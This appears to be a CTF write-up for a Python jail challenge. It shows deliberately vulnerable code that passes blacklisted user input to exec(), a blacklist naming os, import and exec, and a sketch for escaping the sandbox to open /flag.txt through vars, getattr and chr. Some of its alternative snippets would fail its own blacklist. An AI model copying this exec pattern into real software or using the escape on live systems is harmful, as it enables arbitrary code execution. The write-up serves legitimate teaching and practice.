# Blacklist-Hell Challenge - Complete Explanation

## Overview

**Blacklist-Hell** is a medium-difficulty Python jail (pyjail) challenge that presents players with an extremely restrictive blacklist. The challenge demonstrates advanced bypassing techniques using Python's built-in functions and creative string/number construction.

---

## Challenge Structure

### Files Created:
```
pyjail/blacklist-hell/
├── challenge/
│   ├── jail.py           - Main challenge script
│   ├── flag.txt          - The flag to capture
│   └── description.md    - Challenge description for CTF platform
├── solve/
│   ├── solve.py          - Full pwntools-based solver
│   ├── generate_payload.py - Standalone payload generator
│   ├── explanation.md    - Detailed solution walkthrough
│   └── payload.txt       - Generated payload (after running generator)
├── Dockerfile            - Container setup
├── docker-compose.yml    - Easy deployment configuration
├── start.sh              - Helper script to start the challenge
├── hints.md              - Progressive hints for players
├── README.md             - Full documentation
├── test_challenge.py     - Test script for validation
└── manual_test.py        - Manual testing utilities
```

---

## How the Challenge Works

### The Jail Code:
```python
#!/usr/bin/env python3
blacklist = ["/","0","1","2","3","4","5","6","7","8","9","setattr","compile",
             "globals","os","import","_","breakpoint","exit","lambda","eval",
             "exec","read","print","open","'","=",'"',"x","builtins","clear"]

print("="*25)
print(open(__file__).read())
print("="*25)
print("Welcome to the jail!")
print("="*25)

for i in range(2):
    x = input('Enter command: ')
    for c in blacklist:
        if c in x:
            print("Blacklisted word found! Exiting!")
            exit(0)
    exec(x)
```

### Key Restrictions:

1. **No Digits (0-9)**: Can't write numbers directly
   - Blocks: `chr(65)`, `range(10)`, `[0]`, etc.
   
2. **No Quotes (' or ")**: Can't write strings directly
   - Blocks: `"flag"`, `'open'`, etc.
   
3. **No Underscores (_)**: Can't access dunder methods directly
   - Blocks: `__builtins__`, `__import__`, `_io`, etc.
   
4. **No Assignment (=)**: Can't store variables
   - Blocks: `x = 5`, `flag = open(...)`, etc.
   
5. **No Forward Slash (/)**: Can't write file paths directly
   - Blocks: `/flag.txt`, `/etc/passwd`, etc.
   
6. **No Dangerous Functions**: Direct function names blocked
   - Blocks: `open`, `eval`, `exec`, `import`, `print`, `read`, etc.
   
7. **No Variable 'x'**: The loop variable is protected
   - Blocks any code containing the letter 'x'

### What's ALLOWED:
- Functions: `chr()`, `ord()`, `len()`, `getattr()`, `vars()`, `dir()`, `help()`, `type()`, etc.
- Operators: `+`, `-`, `*`, `//`, `%`, `<`, `>`, etc.
- Booleans: `True`, `False`
- Collections: `[]`, `()`, `{}`
- Object introspection
- Two command executions

---

## Solution Strategy

### Step 1: Build Numbers Without Digits

Since all digits are blacklisted, we must construct numbers using Python operations:

```python
# Zero
len([])  # Empty list has length 0

# One
len([[]])  # List with one element has length 1

# Two
len([[]])  + len([[]])
# OR
len([[],[]])  # List with two elements

# Ten (for multiplication efficiency)
(len([[]])+len([[]])+len([[]])+len([[]])+len([[]])+
 len([[]])+len([[]])+len([[]])+len([[]])+len([[]]))

# Sixty-five (for chr(65) = 'A')
((ten)*(len([[]])+len([[]])+...)) + (len([[]])+len([[]])+...)
# = (10 * 6) + 5 = 65
```

**Key Optimization**: Use multiplication to avoid extremely long expressions:
- `65 = 10*6 + 5` is much shorter than `1+1+1+...` (65 times)

### Step 2: Build Strings Without Quotes

Use `chr()` with constructed numbers to build characters:

```python
# Build "open"
chr(111) + chr(112) + chr(101) + chr(110)

# But chr(111) contains digits! So we must:
chr((10*11)+1)  # Build 111

# And that still has digits, so:
one = len([[]])
ten = len([[]])+...+len([[]])  # 10 ones
chr((ten*(one+...+one))+one)  # (10*11)+1
```

**Example ASCII values needed**:
- `_` = 95
- `/` = 47
- `a-z` = 97-122
- `A-Z` = 65-90

### Step 3: Access Forbidden Functions

Since `open`, `__builtins__`, and `_` are all blacklisted, we must build them:

```python
# Get __builtins__ from vars()
vars()[chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+
       chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+
       chr(95)+chr(95)]

# Access 'open' function
getattr(
    vars()[<"__builtins__" as chr sequence>],
    chr(111)+chr(112)+chr(101)+chr(110)  # "open"
)
```

### Step 4: Read the Flag

Chain everything together:

```python
# Complete payload structure:
getattr(
    getattr(
        vars()[<"__builtins__" built with chr()>],
        <"open" built with chr()>
    )(<"/flag.txt" built with chr()>),
    <"read" built with chr()>
)()
```

**What this does**:
1. `vars()` → Get all variables in current scope (includes `__builtins__`)
2. `vars()[...]` → Access the `__builtins__` module
3. `getattr(..., "open")` → Get the `open` function
4. `...("/flag.txt")` → Open the flag file
5. `getattr(..., "read")` → Get the `read` method from file object
6. `...()` → Call `read()` to get flag content

---

## Why This Challenge is Medium Difficulty

### Challenges:
1. **Extreme Tedium**: Building each number without digits creates VERY long payloads (7000+ characters)
2. **Multiple Layers**: Must bypass restrictions on numbers, strings, AND function names
3. **Limited Attempts**: Only 2 command executions
4. **No Variables**: Can't use `=` to store intermediate results

### What Makes It Solvable:
1. **Source Code Provided**: Players can see the blacklist
2. **Well-Known Techniques**: Uses documented pyjail bypass methods
3. **Automation Friendly**: Can write a script to generate the payload
4. **Multiple Approaches**: Several valid solution paths exist

---

## Alternative Solution Approaches

### Method 1: Object Introspection
```python
# Access through object's class hierarchy
getattr([], chr(95)+chr(95)+chr(99)+chr(108)+...)  # __class__
```

### Method 2: Using help()
```python
# help() objects expose internals
help(help).__dict__
```

### Method 3: List Comprehension Tricks
```python
# Use list comprehensions to avoid assignment
[<payload>][0]
```

---

## Testing the Challenge

### Local Testing:
```bash
# Start the challenge
cd pyjail/blacklist-hell
docker-compose up -d --build

# Generate payload
cd solve
python3 generate_payload.py

# Test it
cat payload.txt | nc localhost 1338
```

### Manual Testing:
```bash
# Run jail directly
python3 challenge/jail.py

# Enter test commands:
len([])        # Should work
chr(65)        # Should fail (contains '6' and '5')
```

---

## Educational Value

This challenge teaches:

1. **Python Internals**: Understanding `vars()`, `__builtins__`, `getattr()`
2. **Creative Problem Solving**: Working within extreme constraints
3. **String/Number Construction**: Building primitives from scratch
4. **Automation**: Writing scripts to generate complex payloads
5. **Blacklist Bypass**: Understanding substring matching limitations
6. **Object Introspection**: Accessing hidden Python features

---

## Security Lessons

### For Defenders:
- Simple substring blacklists are insufficient
- Must validate EXECUTION context, not just INPUT strings
- Consider using whitelists instead of blacklists
- AST parsing is more robust than string matching

### For Attackers:
- Dynamic string construction bypasses static blacklists
- Python's reflection capabilities are powerful
- Automation is key for tedious exploits
- Multiple solution paths increase success odds

---

## Flag

```
DSCCTF{bl4ckl1st_byp4ss_w1th_h3x_4nd_chr_m4st3ry_2026}
```

The flag itself hints at the solution:
- `bl4ckl1st_byp4ss` - bypassing blacklists
- `h3x` - using hexadecimal/ASCII values
- `chr_m4st3ry` - mastering the `chr()` function

---

## Deployment Notes

### Docker Setup:
- Uses Python 3.11-slim base image
- Runs with socat for multi-connection support
- 180-second timeout per connection
- Limited resources (256MB RAM, 0.5 CPU)
- Security restrictions (no-new-privileges, PID limits)
- Flag located at `/flag.txt` (read-only)

### Port:
- Default: 1338
- Configurable in docker-compose.yml

---

## Common Player Mistakes

1. **Using digits in chr()**: `chr(65)` is blocked!
2. **Forgetting underscores are blocked**: `__builtins__` won't work
3. **Trying to use quotes**: All quote characters are blacklisted
4. **Manual payload writing**: Too tedious; requires automation
5. **Not testing blacklist first**: Always verify payload passes checks

---

## Success Metrics

A successful solve demonstrates:
- ✓ Understanding of Python jail concepts
- ✓ Ability to automate payload generation
- ✓ Knowledge of Python introspection
- ✓ Creative problem-solving skills
- ✓ Patience with tedious tasks

---

## Future Variations

Potential challenge modifications:
- Blacklist `len()` to force alternative number generation
- Blacklist `chr()` to require `bytes()` or other methods
- Blacklist `vars()` to force class hierarchy traversal
- Add character limits to prevent long payloads
- Blacklist `getattr()` to require direct access
- Implement timeout to prevent brute-force

---

## Credits

Challenge designed for DSCCTF 2026
Category: PyJail / Misc
Difficulty: Medium (200 points)
Author: ShadowPB

---

## Additional Resources

- Python built-in functions: https://docs.python.org/3/library/functions.html
- Python data model: https://docs.python.org/3/reference/datamodel.html
- PyJail techniques: Various CTF writeups and research papers
- ASCII table: https://www.asciitable.com/
